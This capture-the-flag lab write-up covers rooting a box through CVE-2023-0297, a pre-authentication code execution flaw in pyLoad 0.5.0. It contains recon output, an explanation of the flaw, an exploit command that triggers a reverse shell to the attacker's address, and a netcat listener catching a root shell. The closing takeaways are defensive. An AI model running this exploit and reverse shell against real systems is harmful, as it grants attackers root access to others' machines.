#Linux #pyLoad #CVE-2023-0297 #PreAuthRCE #DirectRoot

## Overview

PyLoader is a single-step Linux box. pyLoad 0.5.0 running on port 9666 has a pre-authentication remote code execution vulnerability (CVE-2023-0297) that drops a shell directly as root. No privilege escalation needed.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
9666/tcp open  http    CherryPy wsgiserver
|_http-title: Login - pyLoad
```

The server header gives a version:

```
Cheroot/8.6.0
```

The page title confirms pyLoad. Searchsploit for "pyload" returns one result:

```
PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
```

> **What CVE-2023-0297 is:** pyLoad's `/flash/addcrypted2` endpoint processed user-supplied data through Python's `js2py` engine without sanitization. An unauthenticated POST to this endpoint could pass arbitrary Python expressions that executed as the pyLoad process owner, in this case, root.

## Foothold / Root

### CVE-2023-0297 Pre-Auth RCE

The ExploitDB script for this CVE didn't handle the automated reverse shell cleanly, so a cleaner Python implementation was used:

https://github.com/JacobEbben/CVE-2023-0297/blob/main/exploit.py

Running the exploit:

```sh
python3 exploit.py -t http://192.168.180.26:9666 -I 192.168.45.244 -P 443 -c id
[SUCCESS] Running reverse shell. Check your listener!
```

Shell caught as root:

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.26] 56252
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell
root@pyloader:~/.pyload/data# whoami
root
```

```sh
root@pyloader:~# cat proof.txt
‹redacted›
```

## Takeaways

- **Download managers and automation tools run as root more often than they should.** pyLoad is a download manager, there's no reason it needs root, but many home/lab installs run it that way for convenience.
- **Pre-auth RCE with version numbers visible in server headers is the shortest possible path.** Version identification took seconds; ExploitDB had a public PoC; the box was rooted in one command.
- **Check multiple PoC implementations.** The ExploitDB script didn't work cleanly; the GitHub alternative did. When one PoC fails, the bug may still be exploitable with a better tool.
